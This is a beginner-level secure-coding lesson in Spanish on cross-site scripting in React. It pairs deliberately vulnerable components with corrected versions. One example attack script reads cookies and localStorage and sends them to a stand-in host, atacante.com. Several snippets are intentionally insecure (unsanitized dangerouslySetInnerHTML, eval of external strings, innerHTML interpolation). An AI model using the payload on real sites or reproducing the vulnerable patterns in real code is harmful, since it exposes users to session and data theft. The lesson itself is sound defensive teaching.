# Ejemplo Básico: XSS en React — Vulnerabilidades y Protecciones

> **Nivel:** 🟢 Básico | **Tiempo estimado:** 25 minutos

---

## Objetivo

Identificar patrones de código vulnerable a XSS en React y aplicar las correcciones correspondientes.

---

## Caso 1: Renderizado de Contenido de Usuarios

### ❌ Código Vulnerable

```tsx
// VULNERABLE: Usa dangerouslySetInnerHTML sin sanitizar
interface Post {
  id: string;
  title: string;
  content: string; // Puede contener HTML malicioso
  author: string;
}

function BlogPost({ post }: { post: Post }) {
  return (
    <article>
      <h1>{post.title}</h1>
      <p>Por: {post.author}</p>
      {/* ❌ PELIGROSO: Permite ejecución de cualquier HTML/JS */}
      <div dangerouslySetInnerHTML={{ __html: post.content }} />
    </article>
  );
}
```

**Ataque:** El atacante publica un artículo con este contenido:
```html
<p>Artículo normal...</p>
<script>
  // Robar datos de todos los visitantes
  const userData = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    url: window.location.href
  };
  new Image().src = `https://atacante.com/steal?d=${btoa(JSON.stringify(userData))}`;
</script>
```

### ✅ Código Corregido

```tsx
import DOMPurify from 'dompurify';

function BlogPost({ post }: { post: Post }) {
  // ✅ Sanitizar el HTML antes de renderizar
  const safeContent = DOMPurify.sanitize(post.content, {
    // Solo permitir tags de formato básico
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br', 'blockquote'],
    ALLOWED_ATTR: ['href', 'title'],
  });
  
  return (
    <article>
      {/* ✅ React escapa automáticamente — seguro */}
      <h1>{post.title}</h1>
      <p>Por: {post.author}</p>
      {/* ✅ Contenido sanitizado antes de inyectar */}
      <div dangerouslySetInnerHTML={{ __html: safeContent }} />
    </article>
  );
}
```

---

## Caso 2: URLs Dinámicas

### ❌ Código Vulnerable

```tsx
// VULNERABLE: URL sin validar en href y src
function UserProfile({ profile }: { profile: { website: string; avatar: string } }) {
  return (
    <div>
      {/* ❌ URL podría ser: javascript:robar() */}
      <a href={profile.website}>Mi sitio web</a>
      
      {/* ❌ URL podría ser: javascript:... o data:text/html,<script>... */}
      <img src={profile.avatar} alt="Avatar" />
    </div>
  );
}
```

### ✅ Código Corregido

```tsx
function sanitizeUrl(url: string): string {
  if (!url) return '#';
  
  // Solo permitir protocolos seguros
  const safeProtocols = ['https:', 'http:', 'mailto:'];
  
  try {
    const parsed = new URL(url);
    if (safeProtocols.includes(parsed.protocol)) {
      return url;
    }
  } catch {
    // URL inválida
  }
  
  return '#'; // URL insegura — reemplazar con placeholder
}

function UserProfile({ profile }: { profile: { website: string; avatar: string } }) {
  const safeWebsite = sanitizeUrl(profile.website);
  const safeAvatar = sanitizeUrl(profile.avatar);
  
  return (
    <div>
      {/* ✅ URL validada */}
      <a href={safeWebsite} rel="noopener noreferrer" target="_blank">
        Mi sitio web
      </a>
      
      {/* ✅ URL validada, con fallback */}
      <img
        src={safeAvatar || '/default-avatar.png'}
        alt="Avatar"
        // ✅ No cargar imágenes cross-origin sin necesidad
        referrerPolicy="no-referrer"
      />
    </div>
  );
}
```

---

## Caso 3: Event Handlers Dinámicos

### ❌ Código Vulnerable

```tsx
// VULNERABLE: Ejecutar código dinámico recibido del servidor
function DynamicButton({ action }: { action: string }) {
  return (
    // ❌ NUNCA usar eval() o new Function() con datos externos
    <button onClick={() => eval(action)}>
      Acción
    </button>
  );
}

// También vulnerable:
const handler = new Function('event', action); // ❌
```

### ✅ Código Corregido

```tsx
// ✅ Usar un mapa de acciones predefinidas
type AllowedAction = 'submit' | 'cancel' | 'reset' | 'navigate_home';

const ACTION_HANDLERS: Record<AllowedAction, () => void> = {
  submit: () => console.log('Enviando...'),
  cancel: () => console.log('Cancelando...'),
  reset: () => console.log('Reseteando...'),
  navigate_home: () => window.location.href = '/',
};

function DynamicButton({ action }: { action: string }) {
  const handler = ACTION_HANDLERS[action as AllowedAction];
  
  if (!handler) {
    console.warn(`Acción no permitida: ${action}`);
    return null;
  }
  
  return (
    <button onClick={handler}>
      Acción
    </button>
  );
}
```

---

## Caso 4: Interpolación en innerHTML (fuera de React)

```typescript
// ❌ VULNERABLE: Construir HTML con template strings
function renderUserCard(user: { name: string; bio: string }): string {
  // Si user.name = "><script>robar()</script><span class="", se ejecuta el XSS
  return `
    <div class="user-card">
      <h2>${user.name}</h2>
      <p>${user.bio}</p>
    </div>
  `;
}

document.getElementById('card')!.innerHTML = renderUserCard(user); // ❌

// ✅ SEGURO: Crear elementos DOM programáticamente
function renderUserCardSafe(user: { name: string; bio: string }): HTMLElement {
  const card = document.createElement('div');
  card.className = 'user-card';
  
  const title = document.createElement('h2');
  // textContent escapa automáticamente los caracteres especiales
  title.textContent = user.name; // ✅ Seguro
  
  const bio = document.createElement('p');
  bio.textContent = user.bio; // ✅ Seguro
  
  card.appendChild(title);
  card.appendChild(bio);
  
  return card;
}

document.getElementById('card')!.appendChild(renderUserCardSafe(user)); // ✅
```

---

## Resumen: Reglas de Oro contra XSS

```
┌────────────────────────────────────────────────────────────┐
│               REGLAS DE ORO CONTRA XSS EN REACT            │
│                                                            │
│  1. Usa {variable} en JSX → React escapa automáticamente   │
│                                                            │
│  2. Si NECESITAS HTML, usa DOMPurify.sanitize() primero    │
│                                                            │
│  3. Valida TODAS las URLs antes de usarlas en href/src     │
│                                                            │
│  4. Nunca uses eval(), new Function() o setTimeout(string) │
│                                                            │
│  5. Agrega rel="noopener noreferrer" en links externos     │
│                                                            │
│  6. No guardes tokens en localStorage (XSS los roba)       │
│                                                            │
│  7. Implementa Content Security Policy                     │
└────────────────────────────────────────────────────────────┘
```

---

*← [Volver a la Sección 1.3](../README.md) | [→ Ejemplo Intermedio](./intermedio.md)*
